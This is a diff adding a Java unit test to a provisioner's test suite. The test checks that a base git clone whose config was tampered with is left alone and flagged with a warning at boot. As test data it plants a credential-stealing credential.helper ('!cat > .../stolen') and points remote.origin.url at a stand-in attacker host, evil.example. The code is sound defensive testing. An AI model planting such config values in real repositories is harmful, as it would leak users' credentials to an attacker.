@@ -258,6 +258,38 @@ class ProvisionerTest {
   }
 
   /**
+   * Agents share the OS user and could write the base clone's config while the last container ran.
+   * The next boot must not run git over it with the workspace's credential.
+   */
+  @Test
+  void aBaseCloneWhoseConfigWasTamperedWithIsNotTouchedAtBoot(@TempDir Path tmp)
+      throws IOException, InterruptedException {
+    Path gitBase = tmp.resolve("git");
+    servedWrapper(gitBase, "proj-1", "my-wrapper");
+    Path base = tmp.resolve("base");
+    Env env = new Env("ws-1", "repo-abc", "proj-1", "my-wrapper", gitBase.toUri().toString());
+    assertTrue(Provisioner.provision(base.toFile(), env, ignored -> {}));
+    git(base, "config", "credential.helper", "!cat > " + tmp.resolve("stolen"));
+    git(base, "config", "remote.origin.url", "http://evil.example/x");
+    List<DaemonMessage> out = new ArrayList<>();
+
+    assertTrue(Provisioner.provision(base.toFile(), env, out::add));
+
+    assertTrue(
+        out.stream()
+            .anyMatch(
+                m ->
+                    m instanceof DaemonLog log
+                        && "WARN".equals(log.level())
+                        && log.message().contains("credential.helper")),
+        out.toString());
+    assertEquals(
+        "http://evil.example/x",
+        git(base, "config", "--get", "remote.origin.url").trim(),
+        "nothing ran: not even the origin repair, which would be a git call over a planted config");
+  }
+
+  /**
    * A served wrapper at the address the clone is built from: {@code <gitBase>/<projectId>/<name>}.
    */
   private static Path servedWrapper(Path gitBase, String projectId, String repoName)
